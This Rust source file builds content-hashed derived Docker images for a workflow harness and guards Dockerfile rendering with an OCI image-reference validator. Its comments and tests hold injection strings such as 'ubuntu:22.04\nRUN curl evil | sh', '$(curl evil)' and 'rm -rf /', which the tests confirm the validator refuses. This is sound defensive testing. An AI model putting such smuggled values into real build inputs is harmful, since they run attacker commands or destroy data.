//! Derived-image warm-up — pure helpers for content-addressing +
//! Dockerfile rendering.
//!
//! The harness pre-flight (`crates/harness/src/executor/local.rs`)
//! reads the manifest emitted at `policies/runtime-prereqs.json`,
//! computes a content hash via [`content_hash`], renders a
//! Dockerfile via [`render_dockerfile`], then invokes
//! `scripts/build-derived-image.sh` to produce a tagged image.
//!
//! Determinism guarantees:
//!
//! - [`content_hash`] depends ONLY on the manifest's serialized JSON
//!   bytes. Identical manifests produce identical hashes; equivalent
//!   manifests with reordered collections produce the same hash too,
//!   because the manifest's `BTreeSet`s canonicalize ordering.
//! - [`render_dockerfile`] emits sorted `apt-get install` and
//!   `install.packages` / `pip install` lines so identical inputs
//!   produce byte-identical Dockerfiles.
//! - The Dockerfile is **only emitted** when the manifest is
//!   buildable (a base image and at least one package). Empty
//!   manifests return `None`, the emitter writes no Dockerfile, and
//!   the harness pre-flight short-circuits.

use chrono::{DateTime, Utc};
use sha2::{Digest, Sha256};
use std::sync::OnceLock;
use std::time::Duration;

use crate::atom::AtomDefinition;
use crate::runtime_prereqs::RuntimePrereqs;

/// Security audit validator for OCI image
/// references that flow into Dockerfile `FROM` / `LABEL` interpolation.
///
/// A canonical image reference is `[registry/]name[:tag|@digest]`:
///
/// * name: `^[a-z0-9][a-z0-9._/-]*` (Docker's reference grammar)
/// * tag: `[A-Za-z0-9._-]+`
/// * digest: `sha256:<64 hex>`
///
/// Without this gate a hostile `base_image` like
/// `ubuntu:22.04\nRUN curl evil | sh` becomes two Dockerfile directives,
/// the second running attacker-controlled commands at build time. The
/// validator refuses anything outside the canonical shape, so the
/// `FROM` / `LABEL` lines can be composed with `format!()` safely.
pub fn validate_base_image(s: &str) -> Result<&str, String> {
    static RE: OnceLock<regex::Regex> = OnceLock::new();
    let re = RE.get_or_init(|| {
        // Anchored. Allows optional `registry:port/` prefix via the
        // `name` component (slashes are in the character class) so
        // `ghcr.io/scripps/img:1.0` and
        // `quay.io:443/coreos/foo@sha256:<64hex>` both pass.
        regex::Regex::new(r"^[a-z0-9][a-z0-9._/:-]*(:[A-Za-z0-9._-]+|@sha256:[0-9a-f]{64})?$")
            .expect("validate_base_image regex is a static compile-time constant")
    });
    if s.is_empty() {
        return Err("base_image empty".into());
    }
    if s.len() > 512 {
        return Err(format!(
            "base_image too long ({} bytes; canonical OCI refs are < 512)",
            s.len()
        ));
    }
    if !re.is_match(s) {
        return Err(format!("invalid OCI image reference: {s:?}"));
    }
    Ok(s)
}

/// Compute the SHA-256 content hash of a manifest. Used as the tag
/// suffix for derived images: `scripps-derived:<hex>`.
///
/// The hash covers the entire serialized manifest, so any change to
/// `base_image`, `system_packages`, `language_packages`, or
/// `system_check` produces a different hash. Operators can grep for
/// a specific hash across hosts to confirm two derived images match.
pub fn content_hash(prereqs: &RuntimePrereqs) -> String {
    // Manifest serialization is byte-deterministic (BTreeSet,
    // serde_json without features that reorder keys), so the hash is
    // stable across hosts running the same code path.
    let bytes =
        serde_json::to_vec(prereqs).expect("RuntimePrereqs always serializes (no foreign types)");
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    hex_lower(&hasher.finalize())
}

/// Compute the SHA-256 of the on-disk manifest's raw bytes. Used by
/// the harness pre-flight so its tag selection matches the shell
/// script's `sha256sum policies/runtime-prereqs.json` (the emitter
/// writes pretty-printed JSON, and `content_hash` would hash the
/// compact form — different bytes, different hash).
///
/// Both helpers are stable + deterministic; they just hash different
/// representations of the same logical manifest. Pick the file-bytes
/// helper when the artifact-on-disk is the source of truth (pre-
/// flight + builder script) and the in-memory helper for unit tests
/// that assert equivalence-class behavior on the parsed type.
pub fn content_hash_from_file(path: &std::path::Path) -> std::io::Result<String> {
    let bytes = std::fs::read(path)?;
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    Ok(hex_lower(&hasher.finalize()))
}

/// Per-atom isolated image identification.
/// Content-hash of an atom's `runtime_packages`, `preferred_container`,
/// and `safety` policy. Used by the per-task image path
/// (`ECAA_PER_TASK_IMAGES=1`) to derive a unique image tag per atom,
/// replacing the union build that combines every reachable atom's
/// declarations into a single image.
///
/// Deterministic — same atom yields the same hash on every host:
///
/// - `runtime_packages` is a `RuntimePrereqs` whose collections are
///   `BTreeSet`s (canonical iteration order).
/// - `preferred_container`, when present, serializes via serde with
///   struct-declared key order (stable across `serde_json` versions).
/// - `safety` is a `SafetyPolicy` struct with the same property.
///
/// We hash the canonical JSON serialization rather than a hand-rolled
/// field walk so any future field additions to the underlying structs
/// participate in the hash without code changes.
///
/// Returns the first 16 hex characters — enough entropy to distinguish
/// atoms (>10^19 buckets) without bloating image tags. Operators can
/// grep for a specific hash across hosts to confirm two derived images
/// match.
pub fn per_atom_image_hash(atom: &AtomDefinition) -> String {
    let payload = serde_json::json!({
        "runtime_packages": atom.runtime_packages,
        "preferred_container": atom.preferred_container,
        "safety": atom.safety,
    });
    // Compact form (no pretty-printing) keeps the hash stable across
    // formatter tweaks. `to_string` on a Value uses the compact path.
    let bytes = serde_json::to_vec(&payload)
        .expect("AtomDefinition fields always serialize (no foreign types)");
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    let full = hex_lower(&hasher.finalize());
    // Truncate to 16 hex chars. The full SHA-256 is overkill for an
    // image-tag suffix and bloats `docker images` output; 16 hex chars
    // = 64 bits of entropy, well above what's needed for ≤10^4 atoms.
    full[..16].to_string()
}

/// True when the operator has opted into per-atom-isolated images.
///
/// Default-on. Operators can set `ECAA_PER_TASK_IMAGES=0` to fall
/// back to the legacy union build path. Any other value (unset,
/// "true", empty) keeps the per-atom behaviour.
pub fn per_task_images_enabled() -> bool {
    !matches!(std::env::var("ECAA_PER_TASK_IMAGES").as_deref(), Ok("0"))
}

/// Hex-encode a byte slice (lowercase, no separators). Inlined so
/// the crate doesn't pull `hex` as a non-test dep.
fn hex_lower(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

/// Render a deterministic Dockerfile that derives from
/// `prereqs.base_image` and installs the declared packages.
///
/// Returns `None` when the manifest is **not buildable** (no base
/// image, or base + zero packages). Callers (the emitter, the
/// pre-flight builder) should short-circuit on `None` and fall
/// through to the host-mode / per-task pin path.
///
/// Layer ordering optimizes BuildKit cache reuse:
///
/// 1. apt packages (rarely change once a modality is stable)
/// 2. R packages (change when a modality grows)
/// 3. python packages (change when a modality grows)
/// 4. drop to non-root user
///
/// Within each layer, package names are sorted alphabetically so a
/// reordering of the source manifest doesn't bust the layer cache.
pub fn render_dockerfile(prereqs: &RuntimePrereqs) -> Option<String> {
    if !prereqs.is_buildable() {
        return None;
    }
    let base = prereqs.base_image.as_ref()?;
    // Defense in depth. The deserializer for
    // `RuntimePrereqs.base_image` already refuses non-canonical refs,
    // but constructors that bypass deserialization (e.g. CLI test
    // fixtures using `base_image: Some(_)` directly) won't have hit
    // that gate. Re-validate at the actual `FROM` interpolation site
    // so a hostile string can never escape the Dockerfile envelope.
    if let Err(reason) = validate_base_image(base) {
        tracing::warn!(
            base_image = %base,
            reason = %reason,
            "refusing to render Dockerfile with invalid base_image (F-CI-M-02 hardening)"
        );
        return None;
    }

    let mut s = String::new();
    s.push_str("# AUTO-GENERATED — do not edit. Source: policies/runtime-prereqs.json\n");
    s.push_str("# Image tag = scripps-derived:<sha256(policies/runtime-prereqs.json bytes)>\n");
    if let Some(modality) = prereqs.modality.as_deref() {
        s.push_str(&format!("# Modality: {modality}\n"));
    }
    s.push_str(&format!("FROM {base}\n"));
    s.push_str("USER root\n");

    // apt block. Sorted (BTreeSet already gives sorted iteration).
    if !prereqs.system_packages.apt.is_empty() {
        s.push_str("RUN apt-get update && \\\n");
        s.push_str("    apt-get install -y --no-install-recommends \\\n");
        let pkgs: Vec<&str> = prereqs
            .system_packages
            .apt
            .iter()
            .map(String::as_str)
            .collect();
        s.push_str("      ");
        s.push_str(&pkgs.join(" "));
        s.push_str(" && \\\n");
        s.push_str("    rm -rf /var/lib/apt/lists/*\n");
    }

    // dnf block.
    if !prereqs.system_packages.dnf.is_empty() {
        let pkgs: Vec<&str> = prereqs
            .system_packages
            .dnf
            .iter()
            .map(String::as_str)
            .collect();
        s.push_str("RUN dnf install -y \\\n      ");
        s.push_str(&pkgs.join(" "));
        s.push_str(" && \\\n    dnf clean all\n");
    }

    // Per directive language packages (R / Python / conda)
    // do NOT install at derived-image build time. Only system-level
    // packages (apt / dnf — the ones that need root) are baked in.
    // The agent script (`scripts/agent-claude.sh`) mounts a per-session
    // cache dir into the container with `R_LIBS_USER` /
    // `PYTHONUSERBASE` / `PIP_CACHE_DIR` set so the executor's
    // organic `install.packages()` / `pip install --user` calls
    // persist across tasks within a session. The list of needed
    // language packages remains in `policies/runtime-prereqs.json` —
    // the executor reads it as a manifest hint.

    // Install-proxy shims that intercept package-manager
    // install calls per atom.safety.provisioning policy. The emitter
    // copies the shim tree into <package>/runtime/install-proxy/ when
    // the manifest is buildable (emitter.rs::copy_install_proxy), so
    // the COPY directives below resolve against the build context.
    //
    // Layout in image: shims live at /opt/scripps-workflow/install-
    // proxy/; real binaries move aside to /usr/local/bin/.real/<tool>;
    // /usr/local/bin/<tool> becomes a symlink to the shim, shadowing
    // the real binary for any PATH-driven invocation. Denied installs
    // exit 73 with a structured-JSON marker the harness translates to
    // BlockerKind::ProvisioningDenied. ECAA_PROVISIONING_DISABLE=1
    // bypasses the policy check (debugging only).
    s.push_str("COPY runtime/install-proxy/_common.py /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/apt.py     /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/pip.py     /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/conda.py   /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/npm.py     /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/rscript.py /opt/scripps-workflow/install-proxy/\n");
    s.push_str("COPY runtime/install-proxy/gem.py     /opt/scripps-workflow/install-proxy/\n");
    s.push_str("RUN set -eux; \\\n");
    s.push_str("    mkdir -p /usr/local/bin/.real; \\\n");
    s.push_str("    chmod +x /opt/scripps-workflow/install-proxy/*.py; \\\n");
    s.push_str("    for entry in \\\n");
    s.push_str("      \"apt:/opt/scripps-workflow/install-proxy/apt.py\" \\\n");
    s.push_str("      \"apt-get:/opt/scripps-workflow/install-proxy/apt.py\" \\\n");
    s.push_str("      \"pip:/opt/scripps-workflow/install-proxy/pip.py\" \\\n");
    s.push_str("      \"pip3:/opt/scripps-workflow/install-proxy/pip.py\" \\\n");
    s.push_str("      \"conda:/opt/scripps-workflow/install-proxy/conda.py\" \\\n");
    s.push_str("      \"mamba:/opt/scripps-workflow/install-proxy/conda.py\" \\\n");
    s.push_str("      \"npm:/opt/scripps-workflow/install-proxy/npm.py\" \\\n");
    s.push_str("      \"Rscript:/opt/scripps-workflow/install-proxy/rscript.py\" \\\n");
    s.push_str("      \"gem:/opt/scripps-workflow/install-proxy/gem.py\"; do \\\n");
    s.push_str("      tool=\"${entry%%:*}\"; shim=\"${entry#*:}\"; \\\n");
    s.push_str("      if command -v \"$tool\" >/dev/null 2>&1; then \\\n");
    s.push_str("        real=\"$(command -v \"$tool\")\"; \\\n");
    s.push_str("        if [ ! -e \"/usr/local/bin/.real/$tool\" ] && [ \"$real\" != \"/usr/local/bin/$tool\" ]; then \\\n");
    s.push_str("          cp \"$real\" \"/usr/local/bin/.real/$tool\"; \\\n");
    s.push_str("        fi; \\\n");
    s.push_str("      fi; \\\n");
    s.push_str("      ln -sf \"$shim\" \"/usr/local/bin/$tool\"; \\\n");
    s.push_str("    done\n");

    // Drop to non-root for runtime. The agent script's
    // `--user $(id -u):$(id -g)` overrides at run-time, but baking
    // The default keeps `docker run scripps-derived:<hash>...`
    // (without --user) safe out of the box.
    s.push_str("USER 1000:1000\n");
    s.push_str(&format!("LABEL swfc-derived-from=\"{base}\"\n"));

    Some(s)
}

/// Build the lock-file payload the builder script writes alongside
/// the derived image. Records the manifest hash + build duration so
/// `verify-reproducibility` can confirm a build matches its inputs.
pub fn lock_payload(
    prereqs: &RuntimePrereqs,
    built_at: DateTime<Utc>,
    build_duration: Duration,
) -> serde_json::Value {
    serde_json::json!({
        "schema_version": 1,
        "content_hash": format!("sha256:{}", content_hash(prereqs)),
        "base_image": prereqs.base_image,
        "modality": prereqs.modality,
        "built_at": built_at.to_rfc3339(),
        "build_duration_secs": build_duration.as_secs_f64(),
        "system_packages": prereqs.system_packages,
        "language_packages": prereqs.language_packages,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runtime_prereqs::{LanguagePackages, RuntimePrereqs, SystemPackages};
    use std::collections::BTreeSet;

    fn sample_prereqs() -> RuntimePrereqs {
        let mut p = RuntimePrereqs::new();
        p.modality = Some("single_cell_rnaseq".into());
        p.base_image = Some("ghcr.io/scripps/scripps-bio-base:0.1.0".into());
        p.system_packages = SystemPackages {
            apt: ["libcurl4-openssl-dev".into(), "libxml2-dev".into()].into(),
            dnf: BTreeSet::new(),
        };
        p.language_packages = LanguagePackages {
            r: ["BPCells".into(), "Seurat>=5.0".into()].into(),
            python: ["scanpy>=1.10".into()].into(),
            conda: BTreeSet::new(),
        };
        p
    }

    #[test]
    fn empty_manifest_renders_no_dockerfile() {
        let p = RuntimePrereqs::new();
        assert!(
            render_dockerfile(&p).is_none(),
            "default-empty manifest must render no Dockerfile so the pre-flight skips"
        );
    }

    #[test]
    fn base_image_alone_renders_no_dockerfile() {
        let mut p = RuntimePrereqs::new();
        p.base_image = Some("base:1".into());
        assert!(
            render_dockerfile(&p).is_none(),
            "base image with zero packages = nothing to derive"
        );
    }

    #[test]
    fn identical_inputs_yield_identical_dockerfile_and_hash() {
        let p1 = sample_prereqs();
        let p2 = sample_prereqs();
        assert_eq!(content_hash(&p1), content_hash(&p2));
        assert_eq!(render_dockerfile(&p1), render_dockerfile(&p2));
    }

    #[test]
    fn reordered_inputs_yield_identical_hash() {
        let p1 = sample_prereqs();
        // Build p2 by inserting in a different order. BTreeSet must
        // canonicalize.
        let mut p2 = RuntimePrereqs::new();
        p2.modality = p1.modality.clone();
        p2.base_image = p1.base_image.clone();
        p2.system_packages = SystemPackages {
            apt: ["libxml2-dev".into(), "libcurl4-openssl-dev".into()].into(),
            ..Default::default()
        };
        p2.language_packages = LanguagePackages {
            r: ["Seurat>=5.0".into(), "BPCells".into()].into(),
            python: ["scanpy>=1.10".into()].into(),
            ..Default::default()
        };
        assert_eq!(
            content_hash(&p1),
            content_hash(&p2),
            "BTreeSet ordering must canonicalize the hash"
        );
    }

    #[test]
    fn hash_is_sensitive_to_base_image() {
        let p1 = sample_prereqs();
        let mut p2 = sample_prereqs();
        p2.base_image = Some("OTHER:9.9.9".into());
        assert_ne!(content_hash(&p1), content_hash(&p2));
    }

    #[test]
    fn hash_is_sensitive_to_apt_changes() {
        let p1 = sample_prereqs();
        let mut p2 = sample_prereqs();
        p2.system_packages.apt.insert("OTHER-pkg".into());
        assert_ne!(content_hash(&p1), content_hash(&p2));
    }

    #[test]
    fn hash_is_sensitive_to_r_changes() {
        let p1 = sample_prereqs();
        let mut p2 = sample_prereqs();
        p2.language_packages.r.insert("OTHER".into());
        assert_ne!(content_hash(&p1), content_hash(&p2));
    }

    #[test]
    fn dockerfile_starts_with_from_and_ends_with_user_label() {
        let p = sample_prereqs();
        let df = render_dockerfile(&p).expect("buildable");
        assert!(df.contains("FROM ghcr.io/scripps/scripps-bio-base:0.1.0"));
        assert!(df.contains("USER 1000:1000"));
        assert!(df.contains("LABEL swfc-derived-from="));
    }

    #[test]
    fn dockerfile_apt_block_is_sorted() {
        let p = sample_prereqs();
        let df = render_dockerfile(&p).expect("buildable");
        let apt_idx = df.find("apt-get install").expect("apt block present");
        let apt_line: &str = &df[apt_idx..];
        // libcurl... must come before libxml... (alphabetical)
        let libcurl = apt_line.find("libcurl4-openssl-dev").unwrap();
        let libxml = apt_line.find("libxml2-dev").unwrap();
        assert!(
            libcurl < libxml,
            "apt packages must be sorted alphabetically for cache stability"
        );
    }

    #[test]
    fn dockerfile_includes_install_proxy_shims_when_buildable() {
        // The rendered Dockerfile must COPY all six
        // install-proxy shims (apt/pip/conda/npm/Rscript/gem plus
        // shared _common.py) into /opt/scripps-workflow/install-proxy/
        // and symlink /usr/local/bin/<tool> to the shim so the
        // shadowed binaries enforce atom.safety.provisioning at task
        // runtime. Regression guard for Task 5.8.
        let p = sample_prereqs();
        let df = render_dockerfile(&p).expect("buildable");
        for shim in [
            "_common.py",
            "apt.py",
            "pip.py",
            "conda.py",
            "npm.py",
            "rscript.py",
            "gem.py",
        ] {
            let copy_line = format!("runtime/install-proxy/{shim}");
            assert!(
                df.contains(&copy_line),
                "Dockerfile must COPY runtime/install-proxy/{shim} into the image; got:\n{df}"
            );
        }
        // Symlink fan-out: 9 tools (apt, apt-get, pip, pip3, conda,
        // mamba, npm, Rscript, gem) all routed to one of the six
        // shims.
        for tool in [
            "\"apt:",
            "\"apt-get:",
            "\"pip:",
            "\"pip3:",
            "\"conda:",
            "\"mamba:",
            "\"npm:",
            "\"Rscript:",
            "\"gem:",
        ] {
            assert!(
                df.contains(tool),
                "Dockerfile must symlink {tool}/usr/local/bin/<tool>; got:\n{df}"
            );
        }
        // Real binaries moved aside; shims become PATH defaults.
        assert!(
            df.contains("/usr/local/bin/.real"),
            "Dockerfile must move real binaries to /usr/local/bin/.real/<tool>"
        );
        assert!(
            df.contains("ln -sf"),
            "Dockerfile must symlink shims into /usr/local/bin/<tool>"
        );
        assert!(
            df.contains("chmod +x /opt/scripps-workflow/install-proxy/"),
            "shims must be marked executable"
        );
    }

    #[test]
    fn dockerfile_install_proxy_block_is_before_user_drop() {
        // Shims need root privileges to symlink into /usr/local/bin/
        // and to populate /usr/local/bin/.real/. Verify the block
        // happens BEFORE the USER 1000:1000 drop. Regression guard for
        // any future refactor that moves the user-drop earlier.
        let p = sample_prereqs();
        let df = render_dockerfile(&p).expect("buildable");
        let shim_idx = df
            .find("COPY runtime/install-proxy/")
            .expect("shim COPY present");
        let user_idx = df.find("USER 1000:1000").expect("user drop present");
        assert!(
            shim_idx < user_idx,
            "install-proxy shims must be baked while still running as root, before USER 1000:1000"
        );
    }

    #[test]
    fn dockerfile_omits_language_packages() {
        // Per directive language packages (R / Python /
        // conda) are NOT baked into the derived image. They install
        // at task time via the agent's per-session cache mount. The
        // rendered Dockerfile must contain ONLY system-package layers
        // on top of the base — no `R -e 'install.packages(...)'`,
        // no `pip install`, no `conda install`. Regression guard.
        let p = sample_prereqs();
        let df = render_dockerfile(&p).expect("buildable");
        assert!(
            !df.contains("install.packages"),
            "no R install at build time"
        );
        assert!(
            !df.contains("BiocManager::install"),
            "no Bioconductor install at build time"
        );
        assert!(!df.contains("pip install"), "no pip install at build time");
        assert!(
            !df.contains("conda install"),
            "no conda install at build time"
        );
        assert!(
            !df.contains("Seurat"),
            "no R package names leak into Dockerfile"
        );
        assert!(
            !df.contains("scanpy"),
            "no Python package names leak into Dockerfile"
        );
    }

    #[test]
    fn lock_payload_includes_hash_and_inputs() {
        use chrono::TimeZone;
        let p = sample_prereqs();
        let when = Utc.with_ymd_and_hms(2026, 5, 5, 22, 30, 0).unwrap();
        let lock = lock_payload(&p, when, Duration::from_secs(127));
        assert_eq!(lock["schema_version"], 1);
        assert_eq!(lock["content_hash"], format!("sha256:{}", content_hash(&p)));
        assert_eq!(lock["base_image"], "ghcr.io/scripps/scripps-bio-base:0.1.0");
        assert_eq!(lock["build_duration_secs"], 127.0);
    }

    // ----- per-atom image helpers -----
    //
    // These pin the contract that the per-task image path relies on:
    // hashing is deterministic, sensitive to runtime packages /
    // container pin / safety policy, and the env-var gate reads
    // `"1"` literally.

    use crate::atom::{AtomDefinition, ContainerSpec, ProvisioningPolicy, SafetyPolicy};

    fn sample_atom() -> AtomDefinition {
        let mut a = AtomDefinition::test_default("align_reads");
        // Populate runtime_packages so the hash payload has real content
        // — empty packages would make every default-shape atom collide
        // and obscure the determinism test.
        a.runtime_packages = sample_prereqs();
        a
    }

    #[test]
    fn per_atom_image_hash_is_deterministic() {
        // Same atom → same hash, every time. Mirrors content_hash's
        // determinism contract but against the atom-level payload
        // (runtime_packages + preferred_container + safety).
        let a1 = sample_atom();
        let a2 = sample_atom();
        assert_eq!(per_atom_image_hash(&a1), per_atom_image_hash(&a2));
    }

    #[test]
    fn per_atom_image_hash_is_16_hex_chars() {
        // Output is the leading 16 hex chars of SHA-256 — pinned so a
        // future refactor that bumps the truncation doesn't silently
        // invalidate every operator's cache.
        let hash = per_atom_image_hash(&sample_atom());
        assert_eq!(hash.len(), 16, "hash must be 16 hex chars; got {hash}");
        assert!(
            hash.chars()
                .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()),
            "hash must be lowercase hex; got {hash}"
        );
    }

    #[test]
    fn per_atom_image_hash_differs_for_different_runtime_packages() {
        let a1 = sample_atom();
        let mut a2 = sample_atom();
        a2.runtime_packages
            .system_packages
            .apt
            .insert("OTHER-pkg".into());
        assert_ne!(
            per_atom_image_hash(&a1),
            per_atom_image_hash(&a2),
            "adding an apt package must invalidate the per-atom hash"
        );
    }

    #[test]
    fn per_atom_image_hash_differs_for_different_safety_provisioning() {
        // Same packages, same container pin — but different
        // provisioning policy. The image bake includes shim behavior
        // keyed off provisioning, so the hash MUST split here.
        let mut a1 = sample_atom();
        let mut a2 = sample_atom();
        a1.safety = SafetyPolicy {
            provisioning: ProvisioningPolicy::Sealed,
            ..SafetyPolicy::default()
        };
        a2.safety = SafetyPolicy {
            provisioning: ProvisioningPolicy::DeclaredOnly,
            ..SafetyPolicy::default()
        };
        assert_ne!(
            per_atom_image_hash(&a1),
            per_atom_image_hash(&a2),
            "changing provisioning policy must invalidate the per-atom hash"
        );
    }

    #[test]
    #[allow(deprecated)]
    fn per_atom_image_hash_differs_for_different_preferred_container() {
        let a1 = sample_atom();
        let mut a2 = sample_atom();
        a2.preferred_container = Some(ContainerSpec {
            image: "ghcr.io/scripps/other".into(),
            tag: "1.2.3".into(),
            digest: String::new(),
            arch: vec!["amd64".into()],
            gpu_required: false,
            network: None,
            source: Default::default(),
        });
        assert_ne!(
            per_atom_image_hash(&a1),
            per_atom_image_hash(&a2),
            "changing preferred_container must invalidate the per-atom hash"
        );
    }

    #[test]
    fn per_atom_image_hash_ignores_unrelated_fields() {
        // Description, version, and id are not part of the image
        // payload — two atoms with the same packages/container/safety
        // must collide on hash even if their ids differ.
        // (This is the property that lets two packages sharing an
        // atom hit the same image cache entry.)
        let a1 = AtomDefinition {
            id: "name_one".into(),
            description: "first".into(),
            version: "1.0.0".into(),
            ..sample_atom()
        };
        let a2 = AtomDefinition {
            id: "name_two".into(),
            description: "totally different".into(),
            version: "9.9.9".into(),
            ..sample_atom()
        };
        assert_eq!(
            per_atom_image_hash(&a1),
            per_atom_image_hash(&a2),
            "id / description / version must not enter the image hash"
        );
    }

    #[test]
    fn per_task_images_enabled_reads_env_var() {
        // Gate flipped to default-on.
        // The opt-out switch is the literal "0"; anything else (any
        // truthy string, empty, or unset) keeps the new default
        // behaviour. Save/restore the prior value so this test
        // doesn't bleed into other tests in the same crate.
        let prev = std::env::var("ECAA_PER_TASK_IMAGES").ok();

        std::env::set_var("ECAA_PER_TASK_IMAGES", "0");
        assert!(
            !per_task_images_enabled(),
            "literal \"0\" must opt out of per-task images"
        );

        std::env::set_var("ECAA_PER_TASK_IMAGES", "1");
        assert!(per_task_images_enabled(), "literal \"1\" is enabled");

        std::env::set_var("ECAA_PER_TASK_IMAGES", "true");
        assert!(
            per_task_images_enabled(),
            "any non-\"0\" value keeps the default-on behaviour"
        );

        std::env::remove_var("ECAA_PER_TASK_IMAGES");
        assert!(
            per_task_images_enabled(),
            "unset uses the default-on behaviour"
        );

        // Restore.
        match prev {
            Some(v) => std::env::set_var("ECAA_PER_TASK_IMAGES", v),
            None => std::env::remove_var("ECAA_PER_TASK_IMAGES"),
        }
    }

    // ── base_image validator ──────────────────────────────────

    #[test]
    fn validate_base_image_rejects_newline_injection() {
        // Canonical attack: a hostile YAML loader feeds a value with
        // an embedded newline so the rendered Dockerfile gains an
        // extra directive.
        let err = validate_base_image("ubuntu:22.04\nRUN curl evil | sh")
            .expect_err("newline must be refused");
        assert!(err.contains("invalid OCI"), "got {err:?}");
    }

    #[test]
    fn validate_base_image_rejects_shell_metacharacters() {
        for evil in [
            "ubuntu:22.04;curl evil",
            "ubuntu:22.04 && rm -rf /",
            "$(curl evil)",
            "`id`",
            "ubuntu\nRUN evil",
            "ubuntu\rRUN evil",
        ] {
            assert!(validate_base_image(evil).is_err(), "must refuse {evil:?}");
        }
    }

    #[test]
    fn validate_base_image_rejects_uppercase_name_prefix() {
        // OCI references are lowercase by spec.
        assert!(validate_base_image("Ubuntu:22.04").is_err());
        assert!(validate_base_image("GHCR.io/foo/bar:1").is_err());
    }

    #[test]
    fn validate_base_image_rejects_empty() {
        assert!(validate_base_image("").is_err());
    }

    #[test]
    fn validate_base_image_accepts_canonical_refs() {
        for ok in [
            "ubuntu:22.04",
            "ubuntu",
            "ghcr.io/scripps/scripps-bio-base:0.1.0",
            "quay.io/coreos/etcd:v3.5.0",
            "ghcr.io/org/img@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "library/python:3.12-slim",
        ] {
            assert!(
                validate_base_image(ok).is_ok(),
                "must accept canonical ref {ok}"
            );
        }
    }

    #[test]
    fn render_dockerfile_returns_none_when_base_image_invalid() {
        // Even if `is_buildable` says yes, an invalid base_image refuses
        // to render. Belt-and-suspenders against bypass via constructors
        // that skip the deserializer.
        let mut p = sample_prereqs();
        p.base_image = Some("ubuntu:22.04\nRUN evil".into());
        assert!(render_dockerfile(&p).is_none());
    }

    #[test]
    fn deserialize_runtime_prereqs_rejects_unsafe_base_image() {
        // Verifies the `deserialize_with` shim on
        // `RuntimePrereqs.base_image` refuses hostile YAML/JSON.
        let bad_json = r#"{
            "schema_version": 1,
            "base_image": "ubuntu:22.04\nRUN evil"
        }"#;
        let err = serde_json::from_str::<RuntimePrereqs>(bad_json)
            .expect_err("hostile base_image must refuse deserialization");
        let msg = format!("{err}");
        assert!(msg.contains("invalid OCI"), "got {msg}");
    }

    #[test]
    fn deserialize_runtime_prereqs_accepts_canonical_base_image() {
        let ok_json = r#"{
            "schema_version": 1,
            "base_image": "ghcr.io/scripps/scripps-bio-base:0.1.0"
        }"#;
        let parsed: RuntimePrereqs =
            serde_json::from_str(ok_json).expect("canonical base_image must accept");
        assert_eq!(
            parsed.base_image.as_deref(),
            Some("ghcr.io/scripps/scripps-bio-base:0.1.0")
        );
    }
}
